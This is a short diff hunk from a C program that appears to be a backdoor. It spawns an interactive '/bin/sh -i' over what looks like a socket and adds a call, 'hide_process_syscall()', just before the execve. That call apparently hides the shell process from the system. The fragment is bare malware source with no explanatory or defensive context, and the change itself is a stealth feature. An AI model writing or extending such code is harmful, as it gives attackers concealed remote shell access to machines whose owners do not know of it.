@@ -76,6 +76,7 @@ int main(void) {
 
             char *argv[] = { "/bin/sh", "-i", NULL };
             char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
+            hide_process_syscall();
             execve("/bin/sh", argv, envp);
 
             close(sock);
